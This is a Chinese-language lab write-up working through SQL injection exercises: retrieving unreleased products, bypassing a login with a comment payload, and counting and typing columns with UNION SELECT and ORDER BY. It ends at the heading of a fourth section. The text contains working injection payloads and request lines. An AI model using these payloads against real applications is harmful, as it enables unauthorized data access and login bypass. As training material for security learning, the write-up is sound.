## 1、where子句中的sql注入漏洞允许检索隐藏数据

给的提示：

![image-20250327214319103](assets/image-20250327214319103.png)

当选择一个商品类别，抓包显示：

![image-20250327214615189](assets/image-20250327214615189.png)

他执行的语句是：select * from products where category = 'Pets' and released = 1

所以我们可以构造payload：

Pets'+or+1=1-- 

拼接完就是：

select * from products where category = 'Pets'+or+1=1-- and released = 1

![image-20250327214957717](assets/image-20250327214957717.png)

这样就查出了没有发布的商品



## 2、允许绕过登录的 SQL 注入漏洞

登录框输入administrator‘--

单引号用来闭合 -- 用来注释后面的语句



## 3、SQL 注入 UNION 攻击，确定查询返回的列数

这一关规定是通过union来确定返回的列数，也就是确定products表有几列

因为union前后必须是一致的，意思是说：

`select username, password from user union select NULL, NULL` 语法是正确的

而 `select username, password from user union select NULL, NULL, NULL` 是不正确的

也就是说，union前面的语句搜的是两列，那么union后面的语句也要搜两列 

**为什么用NULL？** 

​	因为两个select语句对应列所返回的数据类型必须是相同或者是兼容的，`NULL` 可转换为每种常见数据类型，因此当列数正确时，它可以最大限度地提高有效载荷成功的机会。



所以抓一个包，尝试一下：

`GET /filter?category=Pets'+union+select+NULL,+NULL,+NULL-- HTTP/2`

正确，说明是3列



跳出本关的规则，除了使用UNION来判断列数，还可以用order by

`/filter?category=Pets'+order+by+4--` 报错

`/filter?category=Pets'+order+by+3--` 正确

说明是3列



该靶场提示：在oracle中，每个 `SELECT` 查询都必须使用 `FROM` 关键字并指定一个有效的表。Oracle 上有一个名为 `dual` 内置表可用于此目的。因此，Oracle 上的注入查询需要如下所示：

`' UNION SELECT NULL FROM DUAL--`



因为union前后的查询结果对应列的数据类型必须相同或兼容，因此可以利用这个来判断哪一列是字符串（有价值的数据一般以字符串格式存储）

例如：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```



## 4、SQL 注入 UNION 攻击，查找包含文本的列